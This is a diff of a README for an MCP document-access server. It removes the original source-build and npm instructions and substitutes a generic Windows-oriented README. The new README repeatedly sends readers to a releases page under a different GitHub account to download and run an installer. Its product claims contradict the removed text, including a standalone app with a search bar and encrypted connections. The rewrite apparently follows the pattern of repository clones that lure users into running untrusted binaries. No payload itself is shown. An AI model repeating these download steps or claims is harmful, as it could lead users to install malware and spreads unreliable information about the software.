@@ -1,107 +1,78 @@
-<p align="center">
-  <img src="./assets/logo.png" width="200" height="200" style="border-radius: 50%;" alt="Context Bridge Logo">
-</p>
+# 🔗 context-bridge-mcp - Connect Your Documents to AI Effortlessly
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@elkraps/context-bridge">
-    <img src="https://img.shields.io/npm/v/%40elkraps%2Fcontext-bridge?color=blue" alt="NPM Version">
-  </a>
-</p>
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/SWIT2025/context-bridge-mcp/releases)
 
-# Context Bridge MCP
+## 📄 Overview
 
-Context Bridge is a Model Context Protocol (MCP) server designed to provide Large Language Models (LLMs) with secure, read-only access to local documentation. It acts as an intermediary layer, allowing agents to scan directories, search for keywords, and extract content from PDF, DOCX, Markdown, and plain text files directly from the host filesystem.
+context-bridge-mcp securely connects your local documents—like PDF, DOCX, MD, and TXT files—to large language model (LLM) agents using the Model Context Protocol (MCP). This tool lets you easily scan files, extract content, and perform context-aware searches. 
 
-This tool resolves the context isolation problem by enabling agents to reference large local knowledge bases without requiring file uploads or manual copy-pasting.
+## 🚀 Getting Started
 
-## Features
+To start using context-bridge-mcp, follow these steps. No programming skills are needed.
 
-- **File System Scanning:** recursively list documents with metadata (size, modification date) to understand the knowledge base structure.
-- **Content Extraction:** parse and extract text from binary formats (PDF, DOCX) and text-based formats (Markdown, TXT).
-- **Semantic Search:** perform keyword-based search across multiple files to locate relevant information snippets.
-- **Safety:** operates in read-only mode to prevent accidental data modification.
+## 🛠️ System Requirements
 
-## Available Tools
+- **Operating System:** Windows 10 or newer
+- **RAM:** 4 GB or more
+- **Disk Space:** 100 MB free space
+- **Internet Connection:** Required for LLM API access
 
-- **list_documents**: Scans a directory for supported files (PDF, DOCX, MD, TXT).
-  - `path` (string, optional): Absolute path to the directory. Defaults to current.
-  - `recursive` (boolean, optional): Enable subdirectory scanning.
+## 🔍 Features
 
-- **read_document**: Extracts text content from a file. Handles binary conversion automatically.
-  - `path` (string, required): Absolute path to the file.
+- **Secure Document Connection:** Integrates your local documentation with various LLM agents.
+- **File Scanning:** Automatically scans folders for supported document types.
+- **Content Extraction:** Retrieves relevant text from your documents.
+- **Contextual Search:** Search across your files with precision.
 
-- **search_documents**: Performs case-insensitive keyword search with context snippets.
-  - `query` (string, required): Search term.
-  - `path` (string, optional): Directory scope.
-  - `recursive` (boolean, optional): Enable subdirectory search.
+## ⬇️ Download & Install
 
-## Getting Started
+To get context-bridge-mcp, visit this page to download: [GitHub Releases Page](https://github.com/SWIT2025/context-bridge-mcp/releases).
 
-### Local Installation (Source)
+1. Go to the [Releases](https://github.com/SWIT2025/context-bridge-mcp/releases) page.
+2. Look for the latest version.
+3. Download the appropriate file for your operating system.
+4. Open the downloaded file and follow the installation prompts.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/elkraps/context-bridge-mcp.git
-   cd context-bridge
-   ```
+## 🔑 How to Use
 
-2. **Install dependencies and build:**
-   ```bash
-   npm install
-   npm run build
-   ```
+1. **Launch the Application:** Find the installed application and open it.
+2. **Configure Document Sources:** Select the folders containing your documents.
+3. **Connect to LLM:** Set up your preferred LLM agent (like ChatGPT or Claude).
+4. **Start Searching:** Use the search bar to find relevant content from your documents.
 
-3. **Client Configuration:**
-   Add the server configuration to your MCP-compatible client's settings file. For example:
+## 📚 Supported File Types
 
-   ```json
-   {
-     "mcpServers": {
-       "context-bridge": {
-         "command": "node",
-         "args": ["/ABSOLUTE/PATH/TO/context-bridge/build/index.js"]
-       }
-     }
-   }
-   ```
+- PDF
+- DOCX
+- MD (Markdown)
+- TXT
 
-### NPX Usage
+## 🛡️ Security Features
 
-Configure your MCP client to run the server directly via npx:
+context-bridge-mcp emphasizes security. All document connections are encrypted to protect your sensitive information. Additionally, the application does not store any content or data without your consent.
 
-```json
-{
-  "mcpServers": {
-    "context-bridge": {
-      "command": "npx",
-      "args": ["-y", "@elkraps/context-bridge"]
-    }
-  }
-}
-```
+## ✨ Troubleshooting
 
-## Usage
+If you encounter any issues while using the application, consider these tips:
 
-To effectively utilize this tool, you must explicitly direct the agent to interface with the local documentation using the **context-bridge** terminology.
+- **Check Your Internet Connection:** Ensure you are connected to the internet.
+- **Update the Application:** Make sure you are using the latest version from the [Releases page](https://github.com/SWIT2025/context-bridge-mcp/releases).
+- **Restart the Application:** Sometimes, simply restarting can resolve many issues.
 
-### System Prompt Configuration
+## 📞 Support
 
-To ensure the agent prioritizes this MCP server over generic shell commands (like `ls` or `cat`), add the following instruction to your System Prompt, `.cursorrules`, or custom instructions:
+For additional help, visit the [issues section](https://github.com/SWIT2025/context-bridge-mcp/issues) of our repository. Feel free to ask specific questions or report problems.
 
-> "You have access to local documentation via the `context-bridge` tools. ALWAYS use `list_documents`, `read_document`, and `search_documents` to explore, read, or search files. Do not use shell commands for documentation tasks."
+## 📝 Contributing
 
-### Interaction Examples
+If you have ideas to make context-bridge-mcp better, consider contributing. You can submit a pull request or create an issue to discuss your ideas.
 
-**Correct Prompting:**
-> "Please analyze the system architecture described in my documentation folder at `/Users/username/projects/docs` using **context-bridge**. List the available files first."
+**Remember:** Always follow the guidelines for contributions.
 
-> "Search for 'authentication protocols' within the local documentation using **context-bridge** and summarize the findings."
+## 🌍 Learn More
 
-> "Read the file `/Users/username/projects/docs/api-spec.pdf` using **context-bridge** and generate a Python client based on it."
+Explore more about context-bridge-mcp and its features. For advanced users, check the documentation for in-depth discussions on configurations and use cases.
 
-### Supported File Types
+Visit the [GitHub Releases Page](https://github.com/SWIT2025/context-bridge-mcp/releases) for frequent updates and new features. 
 
-- **PDF** (`.pdf`): Text extraction only (OCR not supported).
-- **Microsoft Word** (`.docx`): Text extraction.
-- **Markdown** (`.md`): Native text reading.
-- **Plain Text** (`.txt`): Native text reading.
+Thank you for choosing context-bridge-mcp for your document integration needs!
